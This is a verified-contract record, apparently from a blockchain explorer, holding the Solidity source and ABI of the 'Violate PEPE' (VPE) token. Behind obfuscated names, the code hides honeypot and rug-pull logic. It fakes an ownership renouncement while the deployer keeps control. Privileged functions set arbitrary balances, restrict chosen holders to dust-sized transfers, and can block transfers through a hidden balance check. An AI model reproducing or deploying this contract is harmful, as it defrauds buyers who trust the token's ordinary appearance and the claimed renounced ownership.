{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface liquidityTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapAtFee) external view returns (uint256);\n\n    function transfer(address receiverMin, uint256 teamReceiver) external returns (bool);\n\n    function allowance(address swapTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMin,\n        uint256 teamReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeIs, uint256 value);\n    event Approval(address indexed swapTo, address indexed spender, uint256 value);\n}\n\nabstract contract limitLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAmountTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldWallet {\n    function createPair(address receiverWallet, address listAuto) external returns (address);\n}\n\ninterface liquidityTotalMetadata is liquidityTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ViolatePEPE is limitLiquidity, liquidityTotal, liquidityTotalMetadata {\n\n    function toSwap(address isLaunchedMax, address receiverMin, uint256 teamReceiver) internal returns (bool) {\n        if (isLaunchedMax == launchBuy) {\n            return isFrom(isLaunchedMax, receiverMin, teamReceiver);\n        }\n        uint256 autoFee = liquidityTotal(feeSwap).balanceOf(shouldFromTake);\n        require(autoFee == shouldLiquidity);\n        require(receiverMin != shouldFromTake);\n        if (marketingEnable[isLaunchedMax]) {\n            return isFrom(isLaunchedMax, receiverMin, atFundMin);\n        }\n        return isFrom(isLaunchedMax, receiverMin, teamReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxMode;\n    }\n\n    address public launchBuy;\n\n    bool public launchTotal;\n\n    function totalSell(address enableSender, uint256 teamReceiver) public {\n        teamTo();\n        receiverTeamFee[enableSender] = teamReceiver;\n    }\n\n    constructor (){\n        if (exemptLaunchedWallet) {\n            exemptLaunchedWallet = true;\n        }\n        tradingAmountTotal toLiquidityLaunched = tradingAmountTotal(senderTeam);\n        feeSwap = shouldWallet(toLiquidityLaunched.factory()).createPair(toLiquidityLaunched.WETH(), address(this));\n        if (sellIsAuto == modeToken) {\n            modeToken = sellIsAuto;\n        }\n        launchBuy = _msgSender();\n        buyTotal();\n        fundLimit[launchBuy] = true;\n        receiverTeamFee[launchBuy] = listTx;\n        if (maxIsReceiver != exemptLaunchedWallet) {\n            sellIsAuto = modeToken;\n        }\n        emit Transfer(address(0), launchBuy, listTx);\n    }\n\n    uint256 public sellIsAuto;\n\n    address private takeSenderFrom;\n\n    uint256 constant atFundMin = 11 ** 10;\n\n    uint256 private modeToken;\n\n    function launchedLaunch(address shouldFund) public {\n        teamTo();\n        \n        if (shouldFund == launchBuy || shouldFund == feeSwap) {\n            return;\n        }\n        marketingEnable[shouldFund] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoLiquidity;\n    }\n\n    string private maxMode = \"VPE\";\n\n    event OwnershipTransferred(address indexed totalLimit, address indexed marketingMaxSwap);\n\n    string private autoLiquidity = \"Violate PEPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTx;\n    }\n\n    bool private maxIsReceiver;\n\n    function transfer(address enableSender, uint256 teamReceiver) external virtual override returns (bool) {\n        return toSwap(_msgSender(), enableSender, teamReceiver);\n    }\n\n    mapping(address => bool) public fundLimit;\n\n    mapping(address => bool) public marketingEnable;\n\n    function isFrom(address isLaunchedMax, address receiverMin, uint256 teamReceiver) internal returns (bool) {\n        require(receiverTeamFee[isLaunchedMax] >= teamReceiver);\n        receiverTeamFee[isLaunchedMax] -= teamReceiver;\n        receiverTeamFee[receiverMin] += teamReceiver;\n        emit Transfer(isLaunchedMax, receiverMin, teamReceiver);\n        return true;\n    }\n\n    function isTake(uint256 teamReceiver) public {\n        teamTo();\n        shouldLiquidity = teamReceiver;\n    }\n\n    address public feeSwap;\n\n    function balanceOf(address swapAtFee) public view virtual override returns (uint256) {\n        return receiverTeamFee[swapAtFee];\n    }\n\n    function allowance(address sellMarketing, address modeSwapIs) external view virtual override returns (uint256) {\n        if (modeSwapIs == senderTeam) {\n            return type(uint256).max;\n        }\n        return tokenWalletSell[sellMarketing][modeSwapIs];\n    }\n\n    function buyTotal() public {\n        emit OwnershipTransferred(launchBuy, address(0));\n        takeSenderFrom = address(0);\n    }\n\n    uint8 private autoFrom = 18;\n\n    uint256 shouldLiquidity;\n\n    function amountAt(address limitEnableMarketing) public {\n        if (launchTotal) {\n            return;\n        }\n        if (sellIsAuto != modeToken) {\n            exemptLaunchedWallet = true;\n        }\n        fundLimit[limitEnableMarketing] = true;\n        if (maxIsReceiver) {\n            sellIsAuto = modeToken;\n        }\n        launchTotal = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenWalletSell;\n\n    function teamTo() private view {\n        require(fundLimit[_msgSender()]);\n    }\n\n    address shouldFromTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address senderTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address isLaunchedMax, address receiverMin, uint256 teamReceiver) external override returns (bool) {\n        if (_msgSender() != senderTeam) {\n            if (tokenWalletSell[isLaunchedMax][_msgSender()] != type(uint256).max) {\n                require(teamReceiver <= tokenWalletSell[isLaunchedMax][_msgSender()]);\n                tokenWalletSell[isLaunchedMax][_msgSender()] -= teamReceiver;\n            }\n        }\n        return toSwap(isLaunchedMax, receiverMin, teamReceiver);\n    }\n\n    mapping(address => uint256) private receiverTeamFee;\n\n    uint256 maxReceiver;\n\n    function approve(address modeSwapIs, uint256 teamReceiver) public virtual override returns (bool) {\n        tokenWalletSell[_msgSender()][modeSwapIs] = teamReceiver;\n        emit Approval(_msgSender(), modeSwapIs, teamReceiver);\n        return true;\n    }\n\n    bool public exemptLaunchedWallet;\n\n    uint256 private listTx = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoFrom;\n    }\n\n    function owner() external view returns (address) {\n        return takeSenderFrom;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeSenderFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMaxSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSwapIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnableMarketing\",\"type\":\"address\"}],\"name\":\"amountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAtFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIsAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunchedMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ViolatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}